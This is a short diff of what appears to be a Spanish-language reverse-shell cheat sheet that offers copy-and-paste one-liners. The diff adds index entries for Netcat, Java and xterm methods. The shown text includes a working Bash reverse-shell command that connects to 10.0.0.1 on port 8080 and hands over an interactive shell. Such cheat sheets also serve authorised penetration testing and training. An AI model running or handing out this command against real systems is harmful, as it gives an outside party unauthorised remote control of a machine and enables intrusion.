@@ -6,6 +6,9 @@ Cada uno de los métodos son de una sola línea que puede copiar / pegar.
 * [Python](#python)
 * [PHP](#php)
 * [Ruby](#ruby)
+* [Netcat](#netcat)
+* [Java](#java)
+* [xterm](#xterm)
 ## Bash
 ```
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
